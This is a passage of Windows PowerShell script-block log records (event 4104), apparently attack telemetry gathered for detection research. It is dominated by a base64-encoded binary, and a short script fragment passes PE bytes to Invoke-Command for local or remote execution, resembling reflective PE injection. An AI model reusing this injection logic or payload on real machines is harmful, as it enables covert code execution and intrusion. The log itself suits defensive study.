LQMtgy4DLoMvAy+DIAMwgzEDMYMyAzKDMwMzgzQDNIM1AzWDNgM2gzcDN4M4AziDOQM5gzoDOoM7AzuDPAM8gz0DPYM+Az6DPwM/gzADQINBA0GDQgNCg0MDQ4NEA0SDRQNFg0YDRoNHA0eDSANIg0kDSYNKA0qDSwNLg0wDTINNA02DTgNOg08DT4NBA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1eDV8Ndw14DXkNeg17DUANjA2NDY4Njw2QDZENkg2TDZQNlQ2WDZcNmA2ZDZoNmw2eDaENpA2nDaoNrQ2wDbMNtg25DbwNvw2CDcUNyA3LDc4N0Q3UDdcN/A3+Df8NwA4BDgIOAw4EDgUOCg4LDgwODQ4SDh4OHw4gDiEOIw4aDlsOXA5eDmIOaA6pDqoOqw6wDo0O7w8wDzEPMg8zDzgPHg9fD2APYQ9mD0AkAkA9AAAADA5ODk8OUA5RDlYObQ5xDngOeQ56DnwOQA6eDp8OoA6hDqIOow6kDqUOpg6nDqgOqQ6qDqsOrA6tDq4Orw6xDrIOsw60DrsOvA69Dr4Ovw6ADsEOwg7DDsQOxQ7GDscOyA7JDsoOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDuAO5g+nD6gPqQ+qD6sPrA+tD64Prw+wD7EPsg+zD7QPuA+8D4APxA/ID8wP0A/UD9gP3A/gD+gP6Q/rD+wP7Q/uD+8P8A/xD/IP8w/0D/UP9g/3D/kP+g/7D/wP/Q/+D/8PwAAAKAJAHgAAAAEMAgwDDAQMGgwbDBwMJQ4mDicOKA4pDioOLA6tDq4Orw6wDrMOtA61DrYOtw64DrkOug67DrwOvQ6+DoMOxA7FDsYOxw7IDskO2A9ZD1oPWw93D3gPeQ96D3sPfA99D34Pfw9AD4EPgg+HD4gPrA+ALAJABwAAABkPGg8bDxwPHQ8eDx8PIQ8jDwAAADACQBwAgAAtDO4M7wzwDPEM8gzzDPYM9wz4DPkM+gz7DPwMwA6BDoIOgw6EDoUOhg6HDogOiQ6KDosOjA6NDo4Ojw6QDpEOkg6TDpQOlQ6WDpcOmQ6aDpsOnA6dDp4Onw6gDqEOog6jDqQOpQ6mDqcOqA6pDqoOqw6sDq0Org6vDrAOsQ6yDrMOtA61DrYOtw64DrkOug67DrwOvQ6+Dr8OgA7BDsIOww7EDsUOyA7JDsoOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDtwO3Q7eDuAO4g7jDuQO5Q7nDugO6Q7qDusO7A7tDu4O7w7wDvEO8g7zDvQO9Q72DvcO+A75DvoO+w78Dv0O/g7/DsAPAQ8CDwMPBA8GDw4PDw8QDxEPEg8VDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNQ82DzcPOA8FD0YPRw9ID0kPSg9LD0wPTQ9OD08PUA9RD1IPUw9UD1UPVg9XD2QPZQ9oD2kPag9wD3EPcg9zD3QPdQ92D3cPeA95D3oPew98D30Pfg9/D0APgQ+CD4MPhA+FD4YPhw+ID4kPig+LD4wPjQ+OD48PkA+RD5IPkw+UD5UPmA+ZD5oPmw+cD50Png+fD6APoQ+iD6UPqA+pD6sPrA+vD7IPtA+2D7cPuA+6D7sPvg+/D4IPww/GD8cPyA/KD8sPzA/OD88P0A/SD9MP1g/XD9oP2w/eD98P4g/jD+YP5w/qD+sP7g/vD/IP8w/2D/cP+A/6D/sP/A/+D/8PwDQCQCEBAAAEDAUMFAwVDBYMFwwYDBkMLAwtDC4MLwwwDDEMMgwzDDQMNQw2DDcMOAw5DDoMOww8DD0MPgw/DAAMQQxCDEMMRQxUDFUMVgxXDFgMWQxaDFsMXAxdDF4MXwxgDGEMYgxjDGQMZQxmDGcMaAxqDGsMbQxuDG8McAxxDHIMcwx0DHUMdgx3DHgMeQx6DHsMfAx9DEcMjgyPDJAMkQySDJMMlAyZDJoMnQygDKEMogyjDKQMpQymDKcMqAypDKoMqwysDK0MrgyvDLAMsgyzDLUMtgy4DLkMuwy8DL4MvwyBDMIMxAzFDMcMyAzJDMwMzwzQDNMM1gzXDNgM2QzaDNsM3AzdDN4M3wzgDOEM4gzjDOQM5QzmDOcM6AzpDOoM6wzsDO0M7gzvDPAM8QzyDPMM9Az1DPYM9wz4DPkM+gz9DMANAQ0CDQMNBA0FDQYNBw0IDQkNCg0LDQwNDQ0ODRENFA0VDRYNFw0YDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ02DTcNOA05DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1ZDVwNXQ1eDV8NYA1hDWINYw1kDWUNZg1nDWgNaQ1qDWsNbA1tDW4Nbw1wDXENcg1zDXQNdQ12DXcNeA16DXsNfw1ADYENgg2DDYQNhw2KDYsNjQ2ODZANkQ2TDZQNlg2XDZkNmg2cDZ0Nnw2gDaINow2lDaYNqA2pDasNrA2vDbANsQ2yDbMNtA21DbYNtw24DbkNug27DbwNvQ2+Db8NgA3BDcINww3EDcUNxg3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN0g3iDeMN5g3nDegN6Q3qDesN7A3tDe4N7w3wDfMN9g33DfgN+Q36DfsN/A39Df4N/w3ADgEOAg4DDgQOBQ4GDgcOCA4JDgoOCw4MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOGA4ZDhoOGw4cDh0OHg4fDiAOIQ4iDiMOJA4lDiYOJw4oDikOKg4rDi0OMA4xDjIOMw40DjUONg43DjgOOQ46DjsOPA49Dj4OPw4ADkEOQg5DDkQORw5KDksOTA5NDk4OTw5QDlEOUg5TDlQOVQ5WDlcOWA5ZDloOWw5cDl0OXg5fDmAOYQ5kDmgOaQ5qDmsObA5tDm4Obw5wDnEOcg5zDnQOdQ52DngOeQ57DnwOfw5CDoMOhA6FDoYOhw6MDpIOmA6eDp8OpA6lDqoOqw6wDrIOsw62DrcOuA65DroOuw6BDsIOxQ7WDtcO2A7ZDtoO2w7cDt0O3w7ADwEPAg8DDwQPBQ8GDwcPCA8JDwoPCw8MDw0PDg8PDxAPEQ8TDxQPFQ8WDxcPJg8oDyoPLA8wDzEPMg8zDzQPNQ82DzcPOA85DzoPOw88Dz0PPg8/DwAPQQ9CD0MPRA9FD0YPRw9ID0kPSg9LD0wPTQ9OD08PUg9AAAA4AkA1AAAAFA1VDVYNVw1YDVkNWw1cDV0NXg1fDWANYQ1iDWMNZA1lDWYNZw1oDWkNag1rDWwNbQ1uDW8NcA1xDXINcw10DXUNdg13DXgNeQ16DXsNfA19DX4Nfw1ADYENgg2DDYQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaINow2kDaUNpg2nDagNqQ2qDasNrA2tDa4NvQ3+DdIOHA8dDx4PHw8RD1MPVA9ZD1oPQBgDQDAAAAAZDpoOnQ6eDqEOog6lDqYOqQ6qDq0Org6xDrIOtQ62DrkOug69Dr4OgQ7CDsUOxg7JDsoOzQ7ODtEO0g7VDtYO2Q7aDt0O3g7hDuIO5Q7mDukO6g7tDu4O8Q7yDvUO9g75DvoO/Q7+DsEPAg8KDxIPGQ8aDyEPIg8pDyoPMg86DwIPRQ9MD1QPXA9kD2YPZw9uD3UPdg9+D0YPjg+WD54Ppg+uD7YPvg+GD84P1g/eD+YP7g/2D/4PwBwDQAgAAAAGDA4MFgweDCYMLgw2DD0MPgwFDEYMQAAALANALgAAAAAMTAxQDFQMWAxcDGIMZQxmDGcMbgxvDH4MRg3KDcsNzA3NDc4Nzw3QDdEN0g3TDdYN1w3YDdkN2g3bDdwN3Q3+Df8N5Q5zDncOeQ58DkYOiA6VDpcOpA6mDoYOyA7VDtcO5A7mDvMO9Q7CDwQPEQ8TDyAPIg8yDzQPAQ9DD1APUg9fD2APYQ9iD2MPZA9mD1YPmA+lD6cPtA+2D4MPxQ/SD9QP4Q/jD/AP8g//D8AAADADQC4AAAABDA4MEAwdDB8MMgw0DAIMRAxRDFMMYAxiDG8McQx+DEAMjAy6DLwMkgzhDPAM/wzODR4NIA0tDS8NCw1QDVUNWg1cDWkNaw14DXoNRw2JDbINtA2BDcMN0A3SDd8N4Q3uDfANxg4VDiQOMw4ODl0Obg59DkwOmw6qDrkOhg7JDuYO9Q7EDxMPIg8xDz4PPw8BD04PXQ9sD3wPfw9HD4oPmg+pD7gPhw/WD+UP9A/AAAA0A0AhAEAAAwwSDCEMIgwkDC4MLwwxDDkMOgw8DAYMVgxlDGYMaAxyDEEMkAyfDLAMsQyzDIIM0QzgDO8M/gzNDSANIQ0jDTANNA06DT4NBA1IDU4NUg1YDVwNYg1mDWwNcA12DXoNQA2EDYoNjg2YDZ4Nnw2gDaINqA2sDbYNvA29Db4NgA3GDcoN0A3UDdoN3g3kDegN7g3yDfgN/A3CDgYODA4QDhYOGg4gDiQOKg4uDjQOOA4+DgIOSA5MDlIOVg5cDmAOZg5qDnAOdA56Dn4ORA6IDo4Okg6YDpwOog6mDqwOsA62DroOgA7EDsoOzg7UDtUO1g7XDtgO3g7fDuAO4Q7iDugO6Q7qDusO7A7yDvMO9A71DvYO/A79Dv4O/w7ADwYPBw8IDwkPCg8QDxEPEg8TDxQPGA8aDx4PIg8kDygPLA8uDzIPPA8GD0wPUA9WD1cPWA9ZD1oPWw9gD2EPYg9jD2QPZQ9mD2cPag9sD3APdA92D3oPfg9AD4QPgAAAOANAFACAACQMJQwmDCcMKAwuDC8MMAwxDDIMOAw5DDoMOww8DAIMQwxEDEUMRgxMDE0MTgxPDFAMVgxXDFgMWQxaDGAMYQxiDGMMZAxqDGsMbAxtDG4MdAx1DHYMdwx4DH4MfwxADIEMggyIDIkMigyLDIwMkgyTDJQMlQyWDJwMnQyeDJ8MoAymDKcMqAypDKoMsAyxDLIMswy0DLoMuwy8DL0Mvgy/DIQMxQzGDMcMyAzJDMoMywzQDNEM0gzTDNQM1QzaDNsM3AzdDN4M3wzgDOEM5AzlDOcM6gztDO4M8AzxDPMM9Az2DPcM+Qz6DPwM/Qz/DMANAg0DDQUNCA0LDQwNDg0PDRENEg0UDRcNGA0aDRsNHQ0eDSANIQ0jDSQNJg0nDSkNKg0sDS0NLw0wDTINMw01DTgNOQ07DTwNPg0/DQENQg1EDUUNRw1IDUoNSw1NDU4NUA1RDVMNVA1WDVcNWQ1aDVwNXQ1fDWANYg1jDWUNZg1oDWsNbg1vDXENcg10DXUNdw14DXoNew19DX4NQA2BDYMNhA2GDYcNiQ2KDYwNjQ2PDZANkg2TDZUNlg2YDZkNmw2cDZ4NoQ2iDaQNpQ2nDaoNrQ2wDbMNtg25DbwNvQ2/DYANwg3DDcUNyA3JDcsNzg3RDdIN2A3cDeIN5g3sDfAN8g30DfYN+A38Df4Nxg4HDggOCQ4KDgsOEA4RDhIOEw4UDhUOFg4XDhgOGQ4aDhsOHA4dDh4OHw4gDiEOIg4jDiUOJg4nDigOKQ4qDisOLA4tDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='   if ($ComputerName -eq $null -or $ComputerName -imatch \\\"^\\\\s*$\\\")  {   Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs)  }  else  {   Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs) -ComputerName $ComputerName  } }  Main }", "scriptBlockId": "0d7f0a6a-eb19-42f9-8237-fd89ea6d3773"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "3", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (173 of 173):\r\nfo9Cz4XPjM+Uz5hPmg+bj6MPpU+8j7+PnY/kz+fP/Q/AAAAIAcAlAAAAAcwJTAzMOExGDIfMiQyKDIsMjAyhjLLMtAy1DLYMtwySDVfNW01eTWFNZs1wTXrNRM2LjYzNjg2UzZgNmk2bjZzNo42mDakNqk2rjbJNtM23zbkNuk2BzcRNx03IjcnN0g3WDfkN/c3FTgjONE5CDoPOhQ6GDocOiA6djq7OsA6xDrIOsw6Jz2pPSU/ADAHAFwAAACqMCYy+jgDOQs5qTnGOts6+zoNOy87QTtjO3g7DD2hPaU9qT2tPbE9tT25Pb09ND69PsE+xT7JPs0+0T7VPtk+UT/dP+E/5T/pP+0/8T/1P/k/AAAAQAcANAAAAHEwDTERMRUxGTEdMSExJTEpMaExLTIxMjUyOTI9MkEyRTJJMs86LD3nPwAAAFAHADAAAAADMAcwCzAPMBMwFzAbMB8wIzAnMCswLzCBMOQwIzc9N5Y3sjcWOfc9AGAHADwAAABAMFowaTB3MIMwjzCdMK0wwjDZMPwwETEnMTQxQjFQMVsxcTGFMUQyYzJoMhwz6zNrNIE1AHAHABQAAAAaPDI+rT4oP6M/AAAAkAcAXAAAAM8y1zIVMx0zkjObM+Az6TNaNGI0dTV+NYg2kDbENs02AjcKNz43Rzd9N1E4VThZOF04YThlOGk4bThxOHU4jThVOVk5XTlhOWU5aTltOXE5dTl5OQCgBwAYAAAAJz1DPoo+jz6UPq8+tD65PgCwBwAgAAAAFzRMNlQ2izaSNso5UTtZO5A7lzv5PgAAAMAHABwAAAABMgkyQDJHMm01JjcuN2U3bDf/OgDQBwA0AAAA5zooOyw7MDs0Ozg7PDtAO0Q7SDtMO1s7nDugO6Q7qDusO7A7tDu4O7w7wDsA4AcAJAAAAFk7dTt5O307gTuFO4k7jTuRO5U7mTudO4I/AAAA8AcAhAAAAJkxpjHZMeMxLTI3MsEz1jPNNdM1Mjg3OD04QjhNOKE4ETkWOR05QTliOec5GzpCOlw6qDrcO/I7KTxZPGg8fjyUPKs8sjy+PNE81jziPOc8+DxiPWk9ez2EPcw93j3mPfA9+T0KPhw+Nz5jPqA+qj6wPrY+IT8qP2M/bj8AAAgArAAAAGIxbDGLMZIxxTHKMe4yDTM3M28zhzO0M88zFTQaNCQ0KTQ0ND80UzTSNPM0TDVXNaY1vjUgNjI2RDZJNlY2YjZ4Nos2vjbNNtI24zbpNvQ2/DYHNw03GDceNyw3OjdNN1Q3WTd5N343nze8N0U4tjikOa45uznuOQA6MDpNOlg6qjqxOi07RztaO3Q7CD0/PW89oj21PdA91j3oPSY+LD7cPhI/ABAIAFQAAAAvMEswnjDGMXkzyTP6Myo0dTRxNYU1ATa6NsE26TYDNxo3ITdWN2c3gjeON583qDfdN+43CDgROB44KDhKOFs4cDh6OJ04pziaPQAAACAIABABAABlMKQwqzC7MMow0TDpMPAwDjENMz0zbzO+M3s0hjTCNNQ02jR/NYo1lDWaNa41ujXnNSA2UDZrNqY23TbvNiU3SDeiN7I3zTjTOO448zj4OBU5HTlZOWk5gDmIOa85yDnXOeM58TkTOiU6WTp9Opk6pDqpOq46yTrTOu86+jr/OgQ7HzspO0U7UDtVO1o7dTt/O5s7pjurO7A7zjvYO/Q7/zsEPAk8NjxaPHY8gTyGPIs8tTzKPOY88Tz2PPs8HD0sPUg9Uz1YPV09kD20PdA92z3gPeU9Az4mPjE+Pj5TPl4+cj53Pnw+nj6sPrs+3z7xPv0+Cz8sPzM/ST9fP2w/cT9/P+s/AAAAMAgAlAAAAAQwMTA4MEMwUTBYMF4weTCAMIkwvDDRMOIwaDF+Mb4x2jH5MSkytTLUMg0zNDM/M08zxjP9Mxw0MjQ8NFs0eTToNBE1OjVYNdY1/zUoNkQ2zTb7Niw3SDd7N5g3ujc5OJU4NTmkOa45/Dk/OnI6EDsmO4A7vTvHO+I7BDykPKw8gj3vPiI/QT9gP/E/AEAIAEwAAAByMZQxszHgMuYyezXANeY1DDY2No42Sje+N9A3/TcnOFE4Mzk+Ocg6+jotPJg8xzwkPdo+3j7iPuY+6j7uPvI+9j4AAABQCABUAAAAPTBoMswyRjZNNlc2nDekN3M6GDs/O6o70TvaPFQ9Yz11PYc9oz3BPcs93D3hPfY9KT4wPjc+Pj5YPmc+cT5+Pog+mD7wPig/Qz8AAABgCACkAAAAVTGCMaMxqDGzMccx0jHpMRkyLjI8MkUyejKxMucy+jKMM8Az5zMyNBU1ODVeNYA1zDXYNew1ATZBNkw2WTZqNng2gDY5N5s3gzhXOXs5rznaOfw5KTo7Olc6ezqWOqE6zTrrOvY6czt6O4E7iDuVO9Y74zvwO/07FDzbPFg9YT15PYs9uD3mPRo+Ij47Pk0+WT5hPnk+0D4kP6o/AHAIADAAAACkMDExpDHxMckyMjNcM4sz8TMqNEA0YTTZNOA1TDYfPic+Xj5lPgAAAIAIAEwAAACPMYQyjDLDMsoyzzUTORo5ITkoORQ8GzzmPO08bD2APbg9yj3cPe49AD4SPiQ+Nj5IPlo+bD5+PpA+sT7DPtU+5z75PgCQCAB0AAAAMjB4MAExEzHeMfgxODJHMlUycjJ6MqMyqjLBMtcyETMYM1ozYTNqM5QzpzOxM9IzEDQdNEw0WDSKNKA02zTiNDI1RjWmNSU2UjZfNpI2sjbcNpw3pjfQNxw4KzhKOGA4gDk3Omo6tTwyPsE+AKAIAIwAAABiMG0wgDCKMKgwszAOMSoxjTGlMdUx/TEvMkkybzKnMrU1+jXWNlY3IzgxOIw40zjtOfk5CDoTOhc6HzolOis6MTpYOoQ6sDr8Olw7ZzvjPO489Tz7PAo9ET0bPSU9Nj09PWs9cz2YPaA99j0BPg4+Fz4sPs0+1z7sPvw+Pj/PP+M/AAAAsAgAbAAAAAAwUTCaMFcxdTGYMaUxsDEKMm8yrjK9MvsyDjNEM1AzaDPxMwk0PDRZNKM0TTVxNXo2njbuNgM3MjdJN3g3lTepN8s31TcTOC84dzjXOAc5vDluOps6yDoaO007kjswPGE8CT8AwAgAjAAAANIwEjF9MZcxpDHUMfgxAzIQMiIyajKDMgczHDMlMy4zPjNSM1gzXTNjM3QzAzQnNHM0hzSjNEI2XjbiNvA3lTgYOas5wjk+OuY6vTsJPBE8GTwhPCk8RzxPPLE8vTzRPN086TwJPVA9ej2CPZ89rz27Pco9zj7/PkE/eD+VP6k/tD8AAADQCABwAAAAATCJMPAwpTEZMjYyRjKbMpwzrDO9M8Uz1TPmM0w0VzRiNGg0cTSzNN40AzUPNRs1LjVNNXg1kDXVNeE17TX5NQw2MDawNmU3dzeJN/k3Wji1OCM5QjlzOcg6AjwdPDM8STxRPKo/AAAA4AgAOAAAAK0wvjCmM6szvTPbM+8z9TNxNo42EjiBOJI4ozjNOCc5QjneOfI5AzoxOp06Fz4AAADwCABwAAAAzTnROdU52TndOeE55TnpOe058Tn1Ofk5/TkBOgU6CToNOhE6FToZOh06ITolOik6LToxOjU6OTo9OkE6RTpJOlM60TrSPA49GD1/PYo96T33PUE+YT5rPtc+Aj8NP3g/rj/CP+k/AAAAAAkAVAAAAAAwCDAiME8wWDC8McQx2DHgMbYyuzLNMnkzizOVMwY0FzQeNDM0TDRYNF80dDR7NII0jDTINFM1YzVwNeM16jXxNfg1BjYMNhw2KzYAEAkABAEAAJw4rDiwOLQ4uDjEOMg4zDisObg5FDoYOhw6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD0AAAAgCQAQAAAAsDO0M7gzAAAAMAkAEAEAAJgyoDKoMqwysDK0MrgyvDLAMsQyzDLQMtQy2DLcMuAy5DLoMvQy/DIAMwQzCDMMMyA4JDgoOCw4MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOFw4YDhkOGg4bDhwOHQ4eDh8OIA4hDiIOIw4kDiUOJg4nDigOKQ4qDisOLA4tDi4OLw4wDjEOMg41DjYONw44DjkOOg47DjwOPQ4+Dj8OAA5BDkIOQw5EDkUORg5HDkgOSQ5KDksOTA5NDk4OTw5QDlEOUg5TDlQOVQ5WDlcOWA5ZDloOWw5cDl0OXg5fDmAOYg5jDmQOZQ5mDmcOaA5pDmoOaw5sDm0Obg5vDnAOcQ5yDnMOdA51DkAAABACQDIAQAAsDi0OLg4vDgkOSw5NDk8OUQ5TDlUOVw5ZDlsOXQ5fDmEOYw5lDmcOaQ5rDm0Obw5xDnMOdQ53DnkOew59Dn8OQQ6DDoUOhw6JDosOjQ6PDpEOkw6VDpcOmQ6bDp0Onw6hDqMOpQ6nDqkOqw6tDq8OsQ6zDrUOtw65DrsOvQ6/DoEOww7FDscOyQ7LDs0Ozw7RDtMO1Q7XDtkO2w7dDt8O4Q7jDuUO5w7pDusO7Q7vDvEO8w71DvcO+Q77Dv0O/w7BDwMPBQ8HDwkPCw8NDw8PEQ8TDxUPFw8ZDxsPHQ8fDyEPIw8lDycPKQ8rDy0PLw8xDzMPNQ83DzkPOw89Dz8PAQ9DD0UPRw9JD0sPTQ9PD1EPUw9VD1cPWQ9bD10PXw9hD2MPZQ9nD2kPaw9tD28PcQ9zD3UPdw95D3sPfQ9/D0EPgw+FD4cPiQ+LD40Pjw+RD5MPlQ+XD5kPmw+dD58PoQ+jD6UPpw+pD6sPrQ+vD7EPsw+1D7cPuQ+7D70Pvw+BD8MPxQ/HD8kPyw/ND88P0Q/TD9UP1w/ZD9sP3Q/fD+EP4w/lD+cP6Q/rD+0P7w/xD/MP9Q/3D/kP+w/9D/8PwBQCQCIAQAABDAMMBQwHDAkMCwwNDA8MEA6SDpQOlg6YDpoOnA6eDqAOog6kDqYOqA6qDqwOrg6wDrIOtA62DrgOug68Dr4OgA7CDsQOxg7IDsoOzA7ODtAO0g7UDtYO2A7aDtwO3g7gDuIO5A7mDugO6g7sDu4O8A7yDvQO9g74DvoO/A7+DsAPAg8EDwYPCA8KDwwPDg8QDxIPFA8WDxgPGg8cDx4PIA8iDyQPJg8oDyoPLA8uDzAPMg80DzYPOA86DzwPPg8AD0IPRA9GD0gPSg9MD04PUA9SD1QPVg9YD1oPXA9eD2APYg9kD2YPaA9qD2wPbg9wD3IPdA92D3gPeg98D34PQA+CD4QPhg+ID4oPjA+OD5APkg+UD5YPmA+aD5wPng+gD6IPpA+mD6gPqg+sD64PsA+yD7QPtg+4D7oPvA++D4APwg/ED8YPyA/KD8wPzg/QD9IP1A/WD9gP2g/cD94P4A/iD+QP5g/oD+oP7A/uD/AP8g/0D/YP+A/6D/wP/g/AGAJAGgAAAAAMAgwEDAYMCAwKDAwMDgwQDBIMFAwWDBgMGgwcDB4MIAwiDCQMJgwoDCoMLAwuDDAMMgw0DDYMOAw6DDwMPgwADEIMRAxGDEgMSgxMDE4MUAxSDFQMVgxWjteO2I7ZjsAcAkAGAEAAPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DVQPFg8eDyEPJA8nDyoPLQ8uDy8PMA8xDzIPMw80DzUPNg83DzgPOQ86DzsPPA89Dz4PPw8AD0EPQg9DD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD2gPag9sD24PcA9yD3QPdg94D3oPfA9+D0APgg+ED4YPiA+KD4wPjg+QD5IPlA+WD5gPmg+cD54PoA+hD6IPow+kD6UPpg+nD6gPqg+sD64PsA+yD7QPtg+YD9kP2g/bD9wP3Q/eD98P4A/hD+IP4w/lD+cPwAAAIAJAOgBAABQMVgxYDFoMXAxeDGAMYgxkDGYMaAxqDGwMbgxwDHIMdAx2DHgMeQx6DHsMfAx9DH4MfwxADIEMggyDDIQMhQyGDIcMiAyJDIoMiwyMDI0MjgyPDJAMkgyUDJYMmAyaDJwMngygDKIMpAymDKgMqgysDK4MsAyyDLQMtgy4DLoMvAy+DIAMwgzEDMYMyAzKDMwMzgzQDNIM1AzWDNgM2gzcDN4M4AziDOQM5gzoDOoM7AzuDPAM8gz0DPYM+Az6DPwM/gzADQINBA0GDQgNCg0MDQ4NEA0SDRQNFg0YDRoNHA0eDSANIg0kDSYNKA0qDSwNLg0wDTINNA02DTgNOg08DT4NBA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1eDV8Ndw14DXkNeg17DUANjA2NDY4Njw2QDZENkg2TDZQNlQ2WDZcNmA2ZDZoNmw2eDaENpA2nDaoNrQ2wDbMNtg25DbwNvw2CDcUNyA3LDc4N0Q3UDdcN/A3+Df8NwA4BDgIOAw4EDgUOCg4LDgwODQ4SDh4OHw4gDiEOIw4aDlsOXA5eDmIOaA6pDqoOqw6wDo0O7w8wDzEPMg8zDzgPHg9fD2APYQ9mD0AkAkA9AAAADA5ODk8OUA5RDlYObQ5xDngOeQ56DnwOQA6eDp8OoA6hDqIOow6kDqUOpg6nDqgOqQ6qDqsOrA6tDq4Orw6xDrIOsw60DrsOvA69Dr4Ovw6ADsEOwg7DDsQOxQ7GDscOyA7JDsoOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDuAO5g+nD6gPqQ+qD6sPrA+tD64Prw+wD7EPsg+zD7QPuA+8D4APxA/ID8wP0A/UD9gP3A/gD+gP6Q/rD+wP7Q/uD+8P8A/xD/IP8w/0D/UP9g/3D/kP+g/7D/wP/Q/+D/8PwAAAKAJAHgAAAAEMAgwDDAQMGgwbDBwMJQ4mDicOKA4pDioOLA6tDq4Orw6wDrMOtA61DrYOtw64DrkOug67DrwOvQ6+DoMOxA7FDsYOxw7IDskO2A9ZD1oPWw93D3gPeQ96D3sPfA99D34Pfw9AD4EPgg+HD4gPrA+ALAJABwAAABkPGg8bDxwPHQ8eDx8PIQ8jDwAAADACQBwAgAAtDO4M7wzwDPEM8gzzDPYM9wz4DPkM+gz7DPwMwA6BDoIOgw6EDoUOhg6HDogOiQ6KDosOjA6NDo4Ojw6QDpEOkg6TDpQOlQ6WDpcOmQ6aDpsOnA6dDp4Onw6gDqEOog6jDqQOpQ6mDqcOqA6pDqoOqw6sDq0Org6vDrAOsQ6yDrMOtA61DrYOtw64DrkOug67DrwOvQ6+Dr8OgA7BDsIOww7EDsUOyA7JDsoOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDtwO3Q7eDuAO4g7jDuQO5Q7nDugO6Q7qDusO7A7tDu4O7w7wDvEO8g7zDvQO9Q72DvcO+A75DvoO+w78Dv0O/g7/DsAPAQ8CDwMPBA8GDw4PDw8QDxEPEg8VDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNQ82DzcPOA8FD0YPRw9ID0kPSg9LD0wPTQ9OD08PUA9RD1IPUw9UD1UPVg9XD2QPZQ9oD2kPag9wD3EPcg9zD3QPdQ92D3cPeA95D3oPew98D30Pfg9/D0APgQ+CD4MPhA+FD4YPhw+ID4kPig+LD4wPjQ+OD48PkA+RD5IPkw+UD5UPmA+ZD5oPmw+cD50Png+fD6APoQ+iD6UPqA+pD6sPrA+vD7IPtA+2D7cPuA+6D7sPvg+/D4IPww/GD8cPyA/KD8sPzA/OD88P0A/SD9MP1g/XD9oP2w/eD98P4g/jD+YP5w/qD+sP7g/vD/IP8w/2D/cP+A/6D/sP/A/+D/8PwDQCQCEBAAAEDAUMFAwVDBYMFwwYDBkMLAwtDC4MLwwwDDEMMgwzDDQMNQw2DDcMOAw5DDoMOww8DD0MPgw/DAAMQQxCDEMMRQxUDFUMVgxXDFgMWQxaDFsMXAxdDF4MXwxgDGEMYgxjDGQMZQxmDGcMaAxqDGsMbQxuDG8McAxxDHIMcwx0DHUMdgx3DHgMeQx6DHsMfAx9DEcMjgyPDJAMkQySDJMMlAyZDJoMnQygDKEMogyjDKQMpQymDKcMqAypDKoMqwysDK0MrgyvDLAMsgyzDLUMtgy4DLkMuwy8DL4MvwyBDMIMxAzFDMcMyAzJDMwMzwzQDNMM1gzXDNgM2QzaDNsM3AzdDN4M3wzgDOEM4gzjDOQM5QzmDOcM6AzpDOoM6wzsDO0M7gzvDPAM8QzyDPMM9Az1DPYM9wz4DPkM+gz9DMANAQ0CDQMNBA0FDQYNBw0IDQkNCg0LDQwNDQ0ODRENFA0VDRYNFw0YDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ02DTcNOA05DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1ZDVwNXQ1eDV8NYA1hDWINYw1kDWUNZg1nDWgNaQ1qDWsNbA1tDW4Nbw1wDXENcg1zDXQNdQ12DXcNeA16DXsNfw1ADYENgg2DDYQNhw2KDYsNjQ2ODZANkQ2TDZQNlg2XDZkN